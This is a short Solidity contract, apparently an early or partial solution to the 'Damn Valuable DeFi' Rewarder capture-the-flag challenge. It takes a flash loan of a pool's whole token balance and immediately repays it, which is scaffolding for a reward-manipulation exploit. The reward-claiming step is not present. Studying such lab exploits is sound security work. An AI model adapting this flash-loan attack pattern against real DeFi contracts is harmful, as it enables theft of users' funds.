// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract AttackRewarderPool {
    FlashLoanerPool public pool;
    DamnValuableToken public liquidityToken;

    constructor(address _pool, address _liquidityToken) {
        pool = FlashLoanerPool(_pool);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Return tokens from Flash loan
        liquidityToken.transfer(msg.sender, amount);
    }

    function execute() external {
        // get liquidity token balance of pool
        uint256 amount = liquidityToken.balanceOf(address(pool));
        // flash loan with entore pool
        pool.flashLoan(amount);
    }
}
